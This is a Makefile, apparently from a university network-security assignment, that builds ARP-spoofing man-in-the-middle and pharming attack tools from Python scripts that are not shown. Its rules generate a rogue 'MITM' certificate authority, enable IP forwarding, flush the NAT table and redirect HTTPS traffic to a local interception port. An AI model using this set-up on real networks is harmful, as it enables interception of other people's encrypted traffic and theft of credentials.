.PHONY: all clean port_forward mitm_attack pharm_attack

all: mitm_attack pharm_attack

mitm_attack: ca.crt port_forward mitm_attack.py arp.py
	cp mitm_attack.py mitm_attack
	chmod +x mitm_attack

pharm_attack: pharm_attack.py arp.py
	cp pharm_attack.py pharm_attack
	chmod +x pharm_attack

ca.key:
	openssl genrsa -out ca.key 2048

ca.crt: ca.key
	openssl req -new -x509 -days 365 -key ca.key -out ca.crt -subj "/C=TW/O=NYCU/CN=MITM"

port_forward:
	sudo sysctl -w net.ipv4.ip_forward=1
	sudo iptables -t nat -F
	sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

clean:
	-rm -f mitm_attack
	-rm -f pharm_attack
	-rm -f ca.key
	-rm -f ca.crt
	-rm -f mitm.log
